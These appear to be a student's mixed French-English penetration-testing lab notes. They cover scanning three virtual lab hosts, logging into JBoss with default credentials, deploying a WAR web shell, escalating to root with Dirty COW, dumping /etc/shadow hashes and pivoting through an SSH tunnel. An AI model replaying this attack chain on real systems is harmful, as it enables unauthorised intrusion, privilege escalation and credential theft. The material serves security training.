# PenTest
Root/kali
14 fevrier
Outils: 
- Metasploit: open source Pen Testing tool, containing nmap, 1500 exploits
- Armitage: interface graphique pour Metasploit
- Kali
- CVE
### Metasploit
msfconsole to launch
show exploits / use <path/to/exploit> / show options
nmap <ip> -A -p- -T4 
VM Ip Adress 192.168.56.2
msfvenom: tool to create viruses


exploit: code pour s'introduire dans un systeme
auxiliary: outils de scan 
post: moodule de post-exploitation pour élargir la surface d'attaque 
1. nmap 192.168.56.2 on msfconsole

```
msf5 > nmap 192.168.56.2 -A -p- -T4
[*] exec: nmap 192.168.56.2 -A -p- -T4

Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-21 09:19 CET
Nmap scan report for 192.168.56.2
Host is up (0.00041s latency).
Not shown: 65526 closed ports
PORT      STATE SERVICE        VERSION
22/tcp    open  ssh            OpenSSH 5.5p1 Debian 6+squeeze2 (protocol 2.0)
| ssh-hostkey: 
|   1024 3d:a3:87:d8:0c:8f:e0:92:8b:fa:75:e5:4b:5c:2d:30 (DSA)
|_  2048 4c:e3:6b:48:e6:d0:45:89:04:35:f9:58:9b:b0:3b:72 (RSA)
80/tcp    open  http           Apache httpd 2.2.16 ((Debian))
|_http-server-header: Apache/2.2.16 (Debian)
|_http-title: Site doesn't have a title (text/html).
111/tcp   open  rpcbind        2 (RPC #100000)
1090/tcp  open  java-rmi       Java RMI
| rmi-dumpregistry: 
|   jmxrmi
|     javax.management.remote.rmi.RMIServerImpl_Stub
|     @0.0.0.0:1091
|     extends
|       java.rmi.server.RemoteStub
|       extends
|_        java.rmi.server.RemoteObject
1091/tcp  open  java-rmi       Java RMI
8080/tcp  open  http           Apache Tomcat/Coyote JSP engine 1.1
| http-cookie-flags: 
|   /: 
|     JSESSIONID: 
|_      httponly flag not set
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: Apache-Coyote/1.1
|_http-title: Site doesn't have a title (text/html;charset=ISO-8859-1).
9990/tcp  open  http           JBoss Administrator
| http-title: Site doesn't have a title (text/html).
|_Requested resource was /console/index.html
9999/tcp  open  jboss-remoting JBoss Remoting (JBoss management interface)
36103/tcp open  status         1 (RPC #100024)
MAC Address: 08:00:27:21:62:BB (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 2.6.X
OS CPE: cpe:/o:linux:linux_kernel:2.6
OS details: Linux 2.6.32 - 2.6.35
Network Distance: 1 hop
Service Info: Host: 192.168.56.2; OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.41 ms 192.168.56.2

```

2. use auxiliary/scaner/ssh/ssh_version 
```
[+] 192.168.56.2:22       - SSH server version: SSH-2.0-OpenSSH_5.5p1 Debian-6+squeeze2 ( service.version=5.5p1 openssh.comment=Debian-6+squeeze2 service.vendor=OpenBSD service.family=OpenSSH service.product=OpenSSH service.cpe23=cpe:/a:openbsd:openssh:5.5p1 os.vendor=Debian os.family=Linux os.product=Linux os.version=6.0 os.cpe23=cpe:/o:debian:debian_linux:6.0 service.protocol=ssh fingerprint_db=ssh.banner )
```
3. From the nmap service versions, we look for exploits. On https://www.cvedetails.com/vulnerability-list.php?vendor_id=45&product_id=66&version_id=109442&page=1&hasexp=0&opdos=0&opec=0&opov=0&opcsrf=0&opgpriv=0&opsqli=0&opxss=0&opdirt=0&opmemc=0&ophttprs=0&opbyp=0&opfileinc=0&opginf=0&cvssscoremin=0&cvssscoremax=0&year=0&month=0&cweid=0&order=4&trc=28&sha=97848cd121115cb01e96f3d853185c17ec381faf we can see 
```
1 	CVE-2011-3368 	20 	1 		2011-10-05 	2018-01-08 	5.0
	None 	Remote 	Low 	Not required 	Partial 	None 	None
The mod_proxy module in the Apache HTTP Server 1.3.x through 1.3.42, 2.0.x through 2.0.64, and 2.2.x through 2.2.21 does not properly interact with use of (1) RewriteRule and (2) ProxyPassMatch pattern matches for configuration of a reverse proxy, which allows remote attackers to send requests to intranet servers via a malformed URI containing an initial @ (at sign) character. 
```
3. dirb http://192.168.56.2:80 ou 8080 not many interesting results
4. JBoss Application Server 7 
192.168.56.2:9990 then admin admin leads to interface <image JBoss first login.png>
5. Deployments > Manage Deployments > add shell.war 
6. Go to 192.168.56.2:8080/shell ; on terminal, `nc <ip> <port>` then test using for example `uname` which should give `Linux` or whoami to get user
7. get users in /etc/passwd
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
libuuid:x:100:101::/var/lib/libuuid:/bin/sh
Debian-exim:x:101:103::/var/spool/exim4:/bin/false
statd:x:102:65534::/var/lib/nfs:/bin/false
sshd:x:103:65534::/var/run/sshd:/usr/sbin/nologin
user:x:1000:1000:user,,,:/home/user:/bin/bash
messagebus:x:104:107::/var/run/dbus:/bin/false
jboss:x:1001:1001::/home/jboss:/bin/sh
```
8. uname -a
```
	Linux Alice 2.6.32-5-686 #1 SMP Sun Sep 23 09:49:36 UTC 2012 i686 GNU/Linux
```
	
9. We look for an exploit. We find dirty cow https://medium.com/@bondo.mike/dirty-cow-2c79cd6859c9
10. python script to open bash
	
11. 
```
cat /etc/shadow
root:$6$0VBUSTbR$dWc9ZtWkq6W7EnHomPmtmg5aBQ8YILeqBWgdYXGUxv7kvo6d9gbKYk940di3CDEO7H3kVBzpJkEK65XHY48UT/:16371:0:99999:7:::
daemon:*:15635:0:99999:7:::
bin:*:15635:0:99999:7:::
sys:*:15635:0:99999:7:::
sync:*:15635:0:99999:7:::
games:*:15635:0:99999:7:::
man:*:15635:0:99999:7:::
lp:*:15635:0:99999:7:::
mail:*:15635:0:99999:7:::
news:*:15635:0:99999:7:::
uucp:*:15635:0:99999:7:::
proxy:*:15635:0:99999:7:::
www-data:*:15635:0:99999:7:::
backup:*:15635:0:99999:7:::
list:*:15635:0:99999:7:::
irc:*:15635:0:99999:7:::
gnats:*:15635:0:99999:7:::
nobody:*:15635:0:99999:7:::
libuuid:!:15635:0:99999:7:::
Debian-exim:!:15635:0:99999:7:::
statd:*:15635:0:99999:7:::
sshd:*:15635:0:99999:7:::
user:$6$UR.JM6iO$hXFOQOC.jI8WRgnVW9eFOSjw2828K7ii0.3K.zNP5IONBub/e3murYsnB..vxRq3xSo6i6/gkaZqTcs0wqXQ..:15635:0:99999:7:::
messagebus:*:15635:0:99999:7:::
jboss:!:15635:0:99999:7:::
```
We use ssh to connect to firefart, to do that we changed the password to a non-empty one since ssh doesn't accept empty ones

python -c 'import pty; pty.spawn("/bin/bash")'

## Bob
Idem, scp pour récupérer dirty.c d'Alice, on lance, on obtient l'user firefart
```
user@metasploitable:~$ ./dirty
/etc/passwd successfully backed up to /tmp/passwd.bak
Please enter the new password: 
Complete line:
firefart:fik57D3GJz/tk:0:0:pwned:/root:/bin/bash

mmap: b7f20000
madvise 0

ptrace 0
Done! Check /etc/passwd to see if the new user was created.
You can log in with the username 'firefart' and the password 'firefart'.


DON'T FORGET TO RESTORE! $ mv /tmp/passwd.bak /etc/passwd
Done! Check /etc/passwd to see if the new user was created.
You can log in with the username 'firefart' and the password 'firefart'.


DON'T FORGET TO RESTORE! $ mv /tmp/passwd.bak /etc/passwd
user@metasploitable:~$ su firefart
Password: 
firefart@metasploitable:/home/user# whoami && id
firefart
uid=0(firefart) gid=0(root) groups=0(root)

```
Netstat de Bob depuis lui même

```
firefart@metasploitable:/home/user# netstat -nltp
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 0.0.0.0:45504           0.0.0.0:*               LISTEN      -               
tcp        0      0 0.0.0.0:2049            0.0.0.0:*               LISTEN      -               
tcp        0      0 0.0.0.0:35750           0.0.0.0:*               LISTEN      4167/rpc.mountd 
tcp        0      0 0.0.0.0:3306            0.0.0.0:*               LISTEN      4037/mysqld     
tcp        0      0 0.0.0.0:139             0.0.0.0:*               LISTEN      4176/smbd       
tcp        0      0 0.0.0.0:111             0.0.0.0:*               LISTEN      3499/portmap    
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      4290/apache2    
tcp        0      0 0.0.0.0:52018           0.0.0.0:*               LISTEN      3537/rpc.statd  
tcp        0      0 0.0.0.0:1524            0.0.0.0:*               LISTEN      4201/xinetd     
tcp        0      0 0.0.0.0:21              0.0.0.0:*               LISTEN      4201/xinetd     
tcp        0      0 192.168.56.3:53         0.0.0.0:*               LISTEN      3890/named      
tcp        0      0 127.0.0.1:53            0.0.0.0:*               LISTEN      3890/named      
tcp        0      0 127.0.0.1:953           0.0.0.0:*               LISTEN      3890/named      
tcp        0      0 0.0.0.0:445             0.0.0.0:*               LISTEN      4176/smbd       
tcp6       0      0 :::2121                 :::*                    LISTEN      4237/proftpd: (acce
tcp6       0      0 :::53                   :::*                    LISTEN      3890/named      
tcp6       0      0 :::22                   :::*                    LISTEN      3914/sshd       
tcp6       0      0 ::1:953                 :::*                    LISTEN      3890/named   
```

on fait un nmap sur Charlie
```
SCRIPT ENGINE: rpcinfo.nse is not a file.
SCRIPT ENGINE: Aborting script scan.
Interesting ports on 192.168.56.4:
Not shown: 65531 closed ports
PORT      STATE SERVICE VERSION
22/tcp    open  ssh      (protocol 2.0)
80/tcp    open  http    Apache httpd 2.2.16 ((Debian))
111/tcp   open  rpcbind  2 (rpc #100000)
53526/tcp open  status   1 (rpc #100024)
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at http://www.insecure.org/cgi-bin/servicefp-submit.cgi :
SF-Port22-TCP:V=4.53%I=7%D=1/28%Time=5E2FF89F%P=i686-pc-linux-gnu%r(NULL,2
SF:9,"SSH-2\.0-OpenSSH_5\.5p1\x20Debian-6\+squeeze2\r\n");
MAC Address: 08:00:27:76:3A:24 (Cadmus Computer Systems)
No exact OS matches for host (If you know what OS is running on it, see http://insecure.org/nmap/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=4.53%D=1/28%OT=22%CT=1%CU=42437%PV=Y%DS=1%G=Y%M=080027%TM=5E2FF8B
OS:0%P=i686-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=10C%TI=Z%II=I%TS=8)OPS(O1=M5B
OS:4ST11NW4%O2=M5B4ST11NW4%O3=M5B4NNT11NW4%O4=M5B4ST11NW4%O5=M5B4ST11NW4%O6
OS:=M5B4ST11)WIN(W1=16A0%W2=16A0%W3=16A0%W4=16A0%W5=16A0%W6=16A0)ECN(R=Y%DF
OS:=Y%T=40%W=16D0%O=M5B4NNSNW4%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%
OS:Q=)T2(R=N)T3(R=Y%DF=Y%T=40%W=16A0%S=O%A=S+%F=AS%O=M5B4ST11NW4%RD=0%Q=)T4
OS:(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%
OS:F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%
OS:T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%TOS=C0%IPL=164%UN=0%R
OS:IPL=G%RID=G%RIPCK=G%RUCK=G%RUL=G%RUD=G)IE(R=Y%DFI=N%T=40%TOSI=S%CD=S%SI=
OS:S%DLI=S)


Uptime: 0.005 days (since Tue Jan 28 03:55:36 2020)
Network Distance: 1 hop

OS and Service detection performed. Please report any incorrect results at http://insecure.org/nmap/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 38.064 seconds

```
## Charlie
On essaie de faire un tunnel SSH de la kali à Charlie. Problèmes: le loopback sur Bob ne marche pas, on n'arrivait pas à renvoyer de Bob à Charlie.
On essaie plutot d'accéder à Charlie par ssh à partir de la kali. Pour ça sur charlie on modifie iptables 
```
iptables -A INPUT -p tcp -s XXX.XXX.XXX.XXX -j ACCEPT
```
Puis sur la kali on forward le port avec
```
ssh -L 1234:192.168.56.4:80 firefart@192.168.56.3
```
On peut tester avec le navigateur internet de la kali sur localhost:1234 ou avec ```wget localhost:1234```.

Sur la kali, on lance l'xploit files_dir qui nous retourne
```
msf5 auxiliary(scanner/http/files_dir) > run

[*] Using code '404' as not found for files with extension .null
[*] Using code '404' as not found for files with extension .backup
[*] Using code '404' as not found for files with extension .bak
[*] Using code '404' as not found for files with extension .c
[*] Using code '404' as not found for files with extension .cfg
[*] Using code '404' as not found for files with extension .class
[*] Using code '404' as not found for files with extension .copy
[*] Using code '404' as not found for files with extension .conf
[*] Using code '404' as not found for files with extension .exe
[*] Using code '404' as not found for files with extension .html
[*] Using code '404' as not found for files with extension .htm
[*] Using code '404' as not found for files with extension .ini
[*] Using code '404' as not found for files with extension .log
[*] Using code '404' as not found for files with extension .old
[*] Using code '404' as not found for files with extension .orig
[*] Using code '404' as not found for files with extension .php
[+] Found http://127.0.0.1:1234/all.php 200
[+] Found http://127.0.0.1:1234/cat.php 200
[+] Found http://127.0.0.1:1234/header.php 200
[+] Found http://127.0.0.1:1234/index.php 200
[+] Found http://127.0.0.1:1234/show.php 200
[*] Using code '404' as not found for files with extension .tar
[+] Found http://127.0.0.1:1234/website.tar 200
[*] Using code '404' as not found for files with extension .tar.gz
[+] Found http://127.0.0.1:1234/website.tar.gz 200
[*] Using code '404' as not found for files with extension .tgz
[*] Using code '404' as not found for files with extension .tmp
[*] Using code '404' as not found for files with extension .temp
[*] Using code '404' as not found for files with extension .txt
[*] Using code '404' as not found for files with extension .zip
[*] Using code '404' as not found for files with extension ~
[*] Using code '404' as not found for files with extension 
[+] Found http://127.0.0.1:1234/admin 301
[+] Found http://127.0.0.1:1234/all 200
[+] Found http://127.0.0.1:1234/cat 200
[+] Found http://127.0.0.1:1234/classes 301
[+] Found http://127.0.0.1:1234/css 301
[+] Found http://127.0.0.1:1234/images 301
[+] Found http://127.0.0.1:1234/header 200
[+] Found http://127.0.0.1:1234/index 200
[+] Found http://127.0.0.1:1234/manual 301
[+] Found http://127.0.0.1:1234/show 200
[+] Found http://127.0.0.1:1234/website 200
[*] Using code '404' as not found for files with extension 
[+] Found http://127.0.0.1:1234/admin 301
[+] Found http://127.0.0.1:1234/all 200
[+] Found http://127.0.0.1:1234/cat 200
[+] Found http://127.0.0.1:1234/classes 301
[+] Found http://127.0.0.1:1234/css 301
[+] Found http://127.0.0.1:1234/images 301
[+] Found http://127.0.0.1:1234/header 200
[+] Found http://127.0.0.1:1234/index 200
[+] Found http://127.0.0.1:1234/manual 301
[+] Found http://127.0.0.1:1234/show 200
[+] Found http://127.0.0.1:1234/website 200
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```
On peut donc récupérer sur le path /website le code du site 
